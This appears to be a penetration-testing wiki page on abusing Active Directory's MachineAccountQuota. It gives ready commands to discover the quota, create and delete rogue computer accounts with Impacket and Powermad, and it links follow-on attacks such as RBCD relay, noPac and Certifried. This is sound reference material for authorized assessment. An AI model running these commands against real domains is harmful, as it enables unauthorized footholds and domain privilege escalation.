**Computer account creation (MachineAccountQuota)** — by default AD lets a user join up to 10 machines to the domain (the `MachineAccountQuota` attribute). Attackers abuse this to create a computer account for NTLM relay / RBCD attacks and get valid domain credentials.

**Warning:** Setting `MachineAccountQuota` to `0` is not the only control - the `Add workstations to domain` user-right policy can also prevent creation. A non-zero MAQ does not guarantee users can actually create accounts.

## Discovery

**Method 1: CrackMapExec**

```bash

cme ldap 'DC_IP' -d 'DOMAIN' -u 'USER_NAME' -p 'USER_PASS' -M maq

```

**Method 2: PowerShell (domain-joined)**

```powershell

# ActiveDirectory module
Get-ADDomain | Select-Object -ExpandProperty DistinguishedName | Get-ADObject -Properties 'ms-DS-MachineAccountQuota'
# PowerView
Get-DomainObject -Identity 'DOMAIN_DN' | select 'ms-DS-MachineAccountQuota'
# Native (no AD module)
$s = New-Object System.DirectoryServices.DirectorySearcher
$s.Filter = "(objectCategory=domain)"
($s.FindAll().Properties).'ms-ds-machineaccountquota'

```

**Method 3: LDAP query** - see [LDAP Recon](LDAP%20Recon.md).

```

"(objectClass=*)" "ms-DS-MachineAccountQuota"

```

**Check the `Add workstations to domain` policy** - mount `\\DC_FQDN\SYSVOL` and search recursively for `SeMachineAccountPrivilege` (in a `GptTmpl.inf`):

```ini

[Privilege Rights]
SeMachineAccountPrivilege = *S-1-5-11

```

By default that privilege is granted to `S-1-5-11` (Authenticated Users).

## Exploitation

### Create a computer account

```bash

# Impacket
addcomputer.py -computer-name 'COMPUTER_NAME$' -computer-pass 'COMPUTER_PASS' -dc-ip 'DC_IP' -domain-netbios 'DOMAIN' 'DOMAIN/USER_NAME:USER_PASS'

```

```powershell

# Powermad
New-MachineAccount -MachineAccount 'COMPUTER_NAME' -Password $(ConvertTo-SecureString 'COMPUTER_PASS' -AsPlainText -Force)

```

### Delete a computer account

Requires a privileged account (typically a Domain Admin) or the machine account owner.

```bash

# Impacket
addcomputer.py -delete -computer-name 'COMPUTER_NAME$' -dc-ip 'DC_IP' -hashes ':DA_NT_HASH' 'DOMAIN/DA_NAME'

```

```batch

REM net.exe from a Domain Controller
net computer \\COMPUTER_NAME /del

```

```powershell

# Powermad
$password = ConvertTo-SecureString "USER_PASS" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("USER_NAME", $password)
Remove-MachineAccount -MachineAccount 'COMPUTER_NAME' -Credential $creds

```

### Potential attacks

If you can create computer accounts, you may be able to run:
- [NTLM Relay to LDAP](../Relay%20Attacks/NTLM%20Relay/NTLM%20Relay%20to%20LDAP.md) (Attack 2 / Attack 3 - RBCD)
- [noPac (CVE-2021-42278)](../Known%20Exploits/noPac%20%28CVE-2021-42278%29.md)
- [Certifried (CVE-2022-26923)](../Known%20Exploits/Certifried%20%28CVE-2022-26923%29.md)

## Caution

Do not forget to delete any created computer account by the end of the assessment.

## References

- Impacket - https://github.com/fortra/impacket
- Powermad - https://github.com/Kevin-Robertson/Powermad
- The Hacker Recipes - MachineAccountQuota - https://www.thehacker.recipes/ad/movement/domain-settings/machineaccountquota
